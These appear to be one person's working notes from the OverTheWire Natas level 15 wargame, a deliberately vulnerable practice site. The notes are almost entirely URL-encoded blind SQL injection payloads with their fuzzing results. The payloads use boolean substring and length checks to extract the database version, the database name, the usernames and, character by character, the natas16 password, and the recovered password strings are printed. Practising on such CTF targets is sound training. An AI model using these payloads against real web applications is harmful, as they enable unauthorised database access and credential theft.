ey"+OR+substring(@@version,1,1)=5+--+   fuzz-> true
ey"+OR+substring((SELECT+version()),1,1)='5'+--+  fuzz-> true
ey"+OR+length(database())=7+--+   fuzz->  true
ey"+OR+substring(database(),1,1)='a'+--+  fuzz-> natas15

ey"+OR+(SELECT+COUNT(*)+FROM+users)=4+--+ fuzz->true
ey"+OR+(substring((SELECT+*+FROM+users+LIMIT+1),1,1))='a'+--+

tom"+OR+(substring((SELECT+username+FROM+users+limit+1),1,1))='a'+--+

-- size of the username strings

tom"+OR+(length((SELECT+username+FROM+users+LIMIT+1)))=5+--+ fuzz-> true
tom"+OR+(length((SELECT+username+FROM+users+LIMIT+1+OFFSET+1)))=3+--+ fuzz-> true
tom"+OR+(length((SELECT+username+FROM+users+LIMIT+1+OFFSET+2)))=7+--+ fuzz-> true
tom"+OR+(length((SELECT+username+FROM+users+LIMIT+1+OFFSET+3)))=7+--+ fuzz-> true

-- the user name strings
tom"+OR+(substring((SELECT+username+FROM+users+LIMIT+1),1,1))='a'+--+  fuzz-> alice
tom"+OR+(substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+1),1,1))='a'+--+  fuzz-> bob
tom"+OR+(substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+2),1,1))='a'+--+   fuzz-> charlie
tom"+OR+(substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+3),1,1))='a'+--+   fuzz-> natas16
tom"+OR+(substring((SELECT+username+FROM+users+LIMIT+1+OFFSET+3),1,1))=BINARY+'a'+--+   fuzz-> natas16


-- lets see password of user natas16
tom"+OR+(length((SELECT+password+FROM+users+WHERE+username="natas16")))=32+--+   fuzz-> true
tom"+OR+(substring((SELECT+password+FROM+users+WHERE+username="natas16"),1,1))='a'+--+   fuzz-> waiheacj63wnnibroheqi3p9t0m5nhmh
waIheacj63wnnIbroheqi3p9t0m5nhmh

tom"+OR+(substring((SELECT+password+FROM+users+WHERE+username="natas16"),1,1))=BINARY+'a'+--+ fuzz -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh   walla! this works
 